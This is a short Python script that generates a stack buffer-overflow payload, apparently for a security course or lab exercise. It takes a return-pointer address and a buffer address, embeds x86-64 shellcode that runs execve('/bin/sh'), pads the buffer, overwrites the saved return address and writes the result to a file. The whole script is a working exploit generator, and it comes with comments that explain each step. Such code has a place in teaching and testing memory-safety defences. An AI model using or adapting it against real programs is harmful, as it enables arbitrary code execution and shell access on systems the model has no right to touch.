#! /usr/bin/python
import os, sys, struct


def error():
    """
    Display an error message to stderr and exit.
    """
    print(
        f"Usage {__file__} <rip> <bsa> <output>\n\nWhere:",
        "\n  <rip> is the address of the return pointer",
        "\n  <bsa> is the address of the buffer",
        "\n  <output> is the desired output file",
        file=sys.stderr,
    )
    exit(1)


def chptr(pointer):
    """
    Convert a string in either hex or decimal form to an integer.
    Used to parse command line arguments.
    """
    try:
        return int(pointer)
    except ValueError:
        try:
            return int(pointer, 16)
        except ValueError:
            error()


if len(sys.argv) != 4:
    error()


# Read in the three arguments, and raise an error if they are incorrect.
rip = chptr(sys.argv[1])
bsa = chptr(sys.argv[2])
try:
    output = open(sys.argv[3], "wb")
except IOError:
    error()


# This is the shellcode: the actual exploit that we will be using
shellcode = b"W\x48\x83\xec\x7fH1\xc0H1\xffH1\xf6H1\xd2\xb0;H\xbb\xff/bin/sh"
shellcode += b"H\xc1\xeb\x08SH\x89\xe7VWH\x89\xe6\x0f\x05H1\xc0\xc3"


# Sanity check: make sure the return address is
# above the string buffer
if rip < bsa:
    print(
        f"Your return address ({sys.argv[1]})",
        f"is above your buffer address ({sys.argv[2]}).",
        "This means you must have typed the wrong address!",
        file=sys.stderr,
    )


# Compute the length of the stack frame, and make sure it's
# long enough to fit the shellcode!
length = rip - bsa
assert length >= len(shellcode)


# If the buffer contains a zero, we'll need to re-adjust the return
# address, since we can't put a zero in our exploit.
if bsa % 256 == 0:
    bsa += 1
    length -= 1
    exploit = b"\xFF"
else:
    exploit = b""


# Make the final exploit
exploit += shellcode + (b"A" * (length - len(shellcode))) + struct.pack("<Q", bsa)

# Cut off trailing zeros, in case we need to use getchar() to debug
while exploit[-1] == 0:
    exploit = exploit[:-1]
print(exploit)


# Write the exploit out to a file
n = output.write(exploit)
print(f"Wrote {n} bytes to {sys.argv[3]}")
output.close()

